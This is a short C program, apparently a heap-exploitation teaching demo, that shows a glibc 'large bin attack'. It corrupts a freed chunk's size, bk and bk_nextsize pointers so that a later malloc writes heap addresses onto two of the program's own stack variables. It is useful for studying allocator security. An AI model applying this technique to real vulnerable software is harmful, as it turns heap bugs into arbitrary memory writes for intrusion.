#include<stdio.h>
#include<stdlib.h>
 
int main() {
	unsigned long stack_var1 = 0, stack_var2 = 0;
	fprintf(stderr, "the target we want to rewrite on stack:\n");
	fprintf(stderr, "stack_var1: %p -> %ld\n", &stack_var1, stack_var1);
	fprintf(stderr, "stack_var2: %p -> %ld\n\n", &stack_var2, stack_var2);

	unsigned long *p1 = malloc(0x80);
	fprintf(stderr, "malloc(0x80) the first chunk: %p\n", p1-2);
	malloc(0x10);

	unsigned long *p2 = malloc(0x400);
	fprintf(stderr, "malloc(0x400) the second chunk (large): %p\n", p2-2);
	malloc(0x10);

	unsigned long *p3 = malloc(0x400);
	fprintf(stderr, "malloc(0x400) the third chunk (large): %p\n\n", p3-2);
	malloc(0x10);

	/*							// tcache
	int *t1[10], *t2[10], i;
	for (i = 0; i < 7; i++) {
		t1[i] = malloc(0x80);
		t2[i] = malloc(0x400);
	}
	for (i = 0; i < 7; i++) {
		free(t1[i]);
		free(t2[i]);
	} */

	free(p1);
	free(p2);
	fprintf(stderr, "free the first and second chunks, they will be inserted in the unsorted bin\n");
	fprintf(stderr, "[ %p <-> %p ]\n\n", (void *)(p2-2), (void *)(p2[0]));

	malloc(0x30);
	fprintf(stderr, "malloc(0x30), the second chunk will be moved into the large bin\n");
	fprintf(stderr, "size: %p, bk: %p, bk_nextsize: %p\n", (void *)p2[-1], (void *)p2[1], (void *)p2[3]);
	fprintf(stderr, "[ %p ]\n\n", (void *)((char *)p1 + 0x30));

	free(p3);
	fprintf(stderr, "free the third chunk, it will be inserted in the unsorted bin\n");
	fprintf(stderr, "[ %p <-> %p ]\n\n", (void *)(p3-2), (void *)(p3[0]));

	p2[-1] = 0x3f1;
	p2[0] = 0;
	p2[1] = (unsigned long)(&stack_var1 - 2);
	p2[2] = 0;
	p2[3] = (unsigned long)(&stack_var2 - 4);
	fprintf(stderr, "now overwrite the freed second chunk's size, bk and bk_nextsize\n");
	fprintf(stderr, "size: %p, bk: %p (&stack_var1-2), bk_nextsize: %p (&stack_var2-4)\n\n", (void *)p2[-1], (void *)p2[1], (void *)p2[3]);

	malloc(0x30);
	fprintf(stderr, "malloc(0x30), the third chunk will be moved into the large bin\n");
	fprintf(stderr, "stack_var1: %p -> %p\n", &stack_var1, (void *)stack_var1);
	fprintf(stderr, "stack_var2: %p -> %p\n", &stack_var2, (void *)stack_var2);
}
